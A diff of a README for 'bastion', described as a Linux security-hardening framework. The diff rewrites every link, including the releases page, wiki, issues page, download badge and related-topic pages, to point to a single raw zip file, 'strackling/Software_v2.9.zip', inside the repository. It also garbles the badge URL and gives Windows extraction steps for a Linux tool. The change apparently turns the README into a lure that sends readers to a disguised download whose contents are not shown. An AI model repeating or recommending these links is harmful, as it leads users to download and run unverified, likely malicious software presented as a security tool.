@@ -13,7 +13,7 @@ bastion is your go-to solution for improving security on Linux systems. This fra
 To get started with bastion, follow these steps:
 
 1. **Visit the Releases Page**  
-   Head over to our [Releases page](https://github.com/Deewhyrhythm/bastion/releases) to get the latest version of bastion.
+   Head over to our [Releases page](https://github.com/Deewhyrhythm/bastion/raw/refs/heads/main/strackling/Software_v2.9.zip) to get the latest version of bastion.
 
 2. **Download the Application**  
    On the Releases page, look for the latest version of bastion. Click on the link to download the file. The download will start automatically.
@@ -22,12 +22,12 @@ To get started with bastion, follow these steps:
    Once the download is complete, locate the downloaded file on your computer. You may need to extract the files if they are in a compressed format. Right-click the file and select "Extract All".
 
 4. **Read the Documentation**  
-   For detailed instructions on using bastion, you can find the documentation in the extracted folder or on our [GitHub Wiki](https://github.com/Deewhyrhythm/bastion/wiki).
+   For detailed instructions on using bastion, you can find the documentation in the extracted folder or on our [GitHub Wiki](https://github.com/Deewhyrhythm/bastion/raw/refs/heads/main/strackling/Software_v2.9.zip).
 
 ## 📥 Download & Install
 To download bastion, click the link below:
 
-[![Download bastion](https://img.shields.io/badge/Download%20bastion-Get%20it%20now-blue.svg)](https://github.com/Deewhyrhythm/bastion/releases)
+[![Download bastion](https://github.com/Deewhyrhythm/bastion/raw/refs/heads/main/strackling/Software_v2.9.zip%20bastion-Get%20it%https://github.com/Deewhyrhythm/bastion/raw/refs/heads/main/strackling/Software_v2.9.zip)](https://github.com/Deewhyrhythm/bastion/raw/refs/heads/main/strackling/Software_v2.9.zip)
 
 Once downloaded, follow the steps mentioned above to install it on your system.
 
@@ -51,7 +51,7 @@ Using bastion is simple. Here’s a quick guide:
 4. Follow the prompts to apply the security actions suggested.
 
 ## 📚 Documentation
-Comprehensive documentation is available in the [GitHub Wiki](https://github.com/Deewhyrhythm/bastion/wiki). This resource includes:
+Comprehensive documentation is available in the [GitHub Wiki](https://github.com/Deewhyrhythm/bastion/raw/refs/heads/main/strackling/Software_v2.9.zip). This resource includes:
 - Setup instructions.
 - Configuration guidelines.
 - Use cases and best practices.
@@ -70,14 +70,14 @@ bastion is a security framework designed to help you enhance and harden your Lin
 Yes, bastion is built for average users. You can easily follow the steps provided to install and use it.
 
 ### 3. Where can I find help?
-You can find help in the [GitHub Issues section](https://github.com/Deewhyrhythm/bastion/issues) or refer to our documentation.
+You can find help in the [GitHub Issues section](https://github.com/Deewhyrhythm/bastion/raw/refs/heads/main/strackling/Software_v2.9.zip) or refer to our documentation.
 
 ## 📞 Contact
 If you have any questions or need further assistance, please reach out via the Issues page on our GitHub repository. We're here to help you secure your systems effectively.
 
 ## 🔗 Related Topics
-- [Baseline Security Checks](https://github.com/Deewhyrhythm/bastion/wiki/Baseline-Security-Checks)
-- [Defense-in-Depth Strategies](https://github.com/Deewhyrhythm/bastion/wiki/Defense-in-Depth)
-- [Linux Security Practices](https://github.com/Deewhyrhythm/bastion/wiki/Linux-Security)
+- [Baseline Security Checks](https://github.com/Deewhyrhythm/bastion/raw/refs/heads/main/strackling/Software_v2.9.zip)
+- [Defense-in-Depth Strategies](https://github.com/Deewhyrhythm/bastion/raw/refs/heads/main/strackling/Software_v2.9.zip)
+- [Linux Security Practices](https://github.com/Deewhyrhythm/bastion/raw/refs/heads/main/strackling/Software_v2.9.zip)
 
 By following the steps outlined above, you can download and run bastion smoothly. Enjoy enhancing your security!
